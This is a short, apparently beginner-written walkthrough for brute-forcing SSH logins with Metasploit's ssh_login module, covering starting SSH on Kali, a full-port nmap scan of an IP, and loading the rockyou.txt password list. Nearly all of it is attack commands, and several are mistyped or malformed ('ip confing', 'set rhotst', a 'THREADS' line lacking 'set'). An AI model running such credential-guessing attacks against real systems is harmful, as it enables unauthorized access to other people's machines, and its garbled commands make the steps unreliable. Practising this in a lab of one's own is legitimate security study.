# Metasploit-SSH-Brute-Force-Attack

      **Step - 01**
   Open Kali linux commend
  # sudo service ssh start
  # sudo service ssh status
  chek active - (runing)
  

    **Step - 02**
  @ commend
  # ip confing
      find a inet ip addrees 
            ip - 10.173.213.71
  # nmap -p- 10.173.213.71
  

    **Step - 03**
    @ Command
  # msfconsole
  # search ssh_login
  
  [ * which one u want type here 0,1,2
  *Ex- 0   ]
  
  # use 0
  # show options
  # set rhotst
  
  [* target ip enter here
  * USERNAME
  * PASSWORD   ]

  # set PASS_FILE/usr/share/wordlists/rockyou.txt
  # set -ON- SUCCESS true
  # set VERBOSE true
  # THREADS 10
  # run 
  
    [* This final Run ]
    

     ** Step - 04**
  # sudo service ssh start
  # sudo service ssh status 
    [ * Chek Active or Not  ]


-------------------X-------------------------X-----------------------X------------------------X-----------------------X----------------

    
